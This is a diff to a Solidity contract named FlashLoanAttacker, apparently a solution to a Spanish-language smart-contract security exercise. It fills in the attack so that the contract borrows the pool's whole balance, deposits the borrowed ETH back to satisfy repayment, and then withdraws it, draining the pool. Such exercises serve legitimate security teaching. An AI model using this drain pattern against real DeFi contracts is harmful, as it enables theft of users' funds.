@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
+import "hardhat/console.sol";
 
 interface IFlashLoanPool {
     function flashLoan(uint256 amount) external;
@@ -18,13 +19,14 @@ contract FlashLoanAttacker is Ownable {
         pool = IFlashLoanPool(poolAddress);
     }
 
-    function attack() external onlyOwner {
-        // COMPLETAR
-        // ¿Cómo iniciamos el ataque?
-        // ¿Tal vez por el flash loan? ¿Y luego?
+    function attack() external payable onlyOwner {
+        pool.flashLoan(address(pool).balance);
+
+        pool.withdraw();
     }
 
     function execute() external payable {
+        pool.deposit{value: msg.value}();
         // COMPLETAR
         // Si pedimos un flash loan, ¿qué hacemos con los ETH que llegan a esta función?
     }
